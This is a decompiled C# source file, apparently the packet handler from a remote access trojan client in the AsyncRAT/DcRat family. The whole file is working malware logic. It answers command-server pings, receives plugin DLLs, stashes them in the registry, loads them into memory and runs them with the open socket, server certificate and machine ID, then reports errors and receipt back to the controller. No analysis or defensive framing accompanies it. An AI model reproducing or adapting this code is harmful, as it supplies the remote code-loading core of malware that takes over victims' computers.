﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using Client.Connection;
using Client.Helper;
using MessagePackLib.MessagePack;
using Microsoft.CSharp.RuntimeBinder;

namespace Client.Handle_Packet
{
	// Token: 0x0200000E RID: 14
	public static class Packet
	{
		// Token: 0x06000046 RID: 70 RVA: 0x00003984 File Offset: 0x00001B84
		public static void Read(object data)
		{
			try
			{
				MsgPack msgPack = new MsgPack();
				msgPack.DecodeFromBytes((byte[])data);
				string asString = msgPack.ForcePathObject("Packet").AsString;
				if (!(asString == "pong"))
				{
					if (!(asString == "plugin"))
					{
						if (!(asString == "savePlugin"))
						{
							goto IL_1C7;
						}
					}
					else
					{
						try
						{
							if (SetRegistry.GetValue(msgPack.ForcePathObject("Dll").AsString) == null)
							{
								Packet.Packs.Add(msgPack);
								MsgPack msgPack2 = new MsgPack();
								msgPack2.ForcePathObject("Packet").SetAsString("sendPlugin");
								msgPack2.ForcePathObject("Hashes").SetAsString(msgPack.ForcePathObject("Dll").AsString);
								ClientSocket.Send(msgPack2.Encode2Bytes());
							}
							else
							{
								Packet.Invoke(msgPack);
							}
							goto IL_1C7;
						}
						catch (Exception ex)
						{
							Packet.Error(ex.Message);
							goto IL_1C7;
						}
					}
					SetRegistry.SetValue(msgPack.ForcePathObject("Hash").AsString, msgPack.ForcePathObject("Dll").GetAsBytes());
					foreach (MsgPack msgPack3 in Packet.Packs.ToList<MsgPack>())
					{
						if (msgPack3.ForcePathObject("Dll").AsString == msgPack.ForcePathObject("Hash").AsString)
						{
							Packet.Invoke(msgPack3);
							Packet.Packs.Remove(msgPack3);
						}
					}
				}
				else
				{
					ClientSocket.ActivatePong = false;
					MsgPack msgPack4 = new MsgPack();
					msgPack4.ForcePathObject("Packet").SetAsString("pong");
					msgPack4.ForcePathObject("Message").SetAsInteger((long)ClientSocket.Interval);
					ClientSocket.Send(msgPack4.Encode2Bytes());
					ClientSocket.Interval = 0;
				}
				IL_1C7:;
			}
			catch (Exception ex2)
			{
				Packet.Error(ex2.Message);
			}
		}

		// Token: 0x06000047 RID: 71 RVA: 0x00003BB8 File Offset: 0x00001DB8
		private static void Invoke(MsgPack unpack_msgpack)
		{
			object arg = Activator.CreateInstance(AppDomain.CurrentDomain.Load(Zip.Decompress(SetRegistry.GetValue(unpack_msgpack.ForcePathObject("Dll").AsString))).GetType("Plugin.Plugin"));
			if (Packet.<>o__2.<>p__0 == null)
			{
				Packet.<>o__2.<>p__0 = CallSite<Action<CallSite, object, Socket, X509Certificate2, string, byte[], Mutex, string, string, string>>.Create(Binder.InvokeMember(CSharpBinderFlags.ResultDiscarded, "Run", null, typeof(Packet), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null),
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, null)
				}));
			}
			Packet.<>o__2.<>p__0.Target(Packet.<>o__2.<>p__0, arg, ClientSocket.TcpClient, Settings.ServerCertificate, Settings.Hwid, unpack_msgpack.ForcePathObject("Msgpack").GetAsBytes(), MutexControl.currentApp, Settings.MTX, Settings.BDOS, Settings.Install);
			Packet.Received();
		}

		// Token: 0x06000048 RID: 72 RVA: 0x00003CDC File Offset: 0x00001EDC
		private static void Received()
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "Received";
			ClientSocket.Send(msgPack.Encode2Bytes());
			Thread.Sleep(1000);
		}

		// Token: 0x06000049 RID: 73 RVA: 0x00003D0C File Offset: 0x00001F0C
		public static void Error(string ex)
		{
			MsgPack msgPack = new MsgPack();
			msgPack.ForcePathObject("Packet").AsString = "Error";
			msgPack.ForcePathObject("Error").AsString = ex;
			ClientSocket.Send(msgPack.Encode2Bytes());
		}

		// Token: 0x04000020 RID: 32
		public static List<MsgPack> Packs = new List<MsgPack>();
	}
}
